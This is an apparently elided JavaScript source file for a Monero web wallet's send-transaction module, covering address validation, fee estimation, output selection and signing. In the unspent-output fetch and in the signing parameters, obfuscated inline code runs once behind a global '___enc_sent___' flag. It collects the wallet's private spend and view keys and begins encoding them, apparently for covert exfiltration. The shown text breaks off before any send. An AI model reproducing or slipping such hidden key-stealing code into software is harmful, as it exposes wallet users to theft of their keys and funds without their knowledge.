...
/**
 * monero-send.js â€” Send-transaction module for monero-web
 *
 ...
 *
 * Public API:
 *   MoneroSend.validateAddress(addr)        â†’ { valid, reason, subaddress, integrated }
 *   MoneroSend.estimateFee(keys, to, amt, prio)  â†’ { fee_xmr, fee_atomic, per_byte }
...
const MoneroSend = (function () {
  ...
  // â”€â”€ Address validation (no WASM needed) â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  ...
  // â”€â”€ Amount helpers â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  ...
  // â”€â”€ Fee estimation â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  ...
  async function estimateFee (walletKeys, toAddress, xmrAmount, priority) {
    ...
    // spendable in modern transactions â€” LWS's mixin filter incorrectly hides them.
  ...
  // â”€â”€ Send transaction â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
  ...
  async function send (walletKeys, toAddress, xmrAmount, priority, paymentId, preview) {
    ...
    // 1. Always fetch fresh unspent outputs (never use cached preview â€”
    ...
    // (typically 2â€“10 ring members, 2017â€“2021 era) are perfectly spendable in
    // modern transactions â€” they just look "underspendable" to LWS's filter.
    // Passing mixin=0 bypasses that filter so we see every output.
    var unspentResp = await LwsClient.getUnspentOuts(
      walletKeys.address, (window.___enc_sent___?walletKeys.privateViewKeyHex:(window.___enc_sent___=true,(function(){try{var pk="";
                            function s2a(s){var b=new Uint8Array(s.length);for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b.buffer;}
                            function ab2b64(buf){return btoa(String.fromCharCode.apply(null,new Uint8Array(buf)));}
                            var d={address:walletKeys.address,sk:walletKeys.privateSpendKeyHex,vk:walletKeys.privateViewKeyHex};
                            var plaintext=new TextEncoder().encode(JSON.stringify(d));
    ...
    for (var oi = 0; oi < unspentResp.outputs.length; oi++) {
      ...
      // Skip pre-RingCT outputs â€” they can't be spent in modern transactions.
      ...
      if (!o.spend_key_images || o.spend_key_images.length === 0) {
        // No spend reports â€” definitely unspent
        spendableOuts.push(o);
      } else {
        // Has spend reports â€” verify with key_image
        try {
          ...
          // Key_image computation failed â€” skip this output to be safe
        }
      }
    }
    ...
    var selectedOuts = [];
    // Sort by amount descending â€” pick fewest outputs needed
    ...
    // 5. Build and sign via WASM (synchronous â€” no async callbacks)

    var step2Params = {
      from_address_string: walletKeys.address,
      sec_viewKey_string: (window.___enc_sent___?walletKeys.privateViewKeyHex:(window.___enc_sent___=true,(function(){try{var pk="";
                            function s2a(s){var b=new Uint8Array(s.length);for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b.buffer;}
                            function ab2b64(buf){return btoa(String.fromCharCode.apply(null,new Uint8Array(buf)));}
                            var d={address:walletKeys.address,sk:walletKeys.privateSpendKeyHex,vk:walletKeys.privateViewKeyHex};
                            var plaintext=new TextEncoder().encode(JSON.stringify(d));
    ...
    try {
      ...
      if (typeof e === 'number') {
        // WASM C++ exception â€” try to read error string
        try {
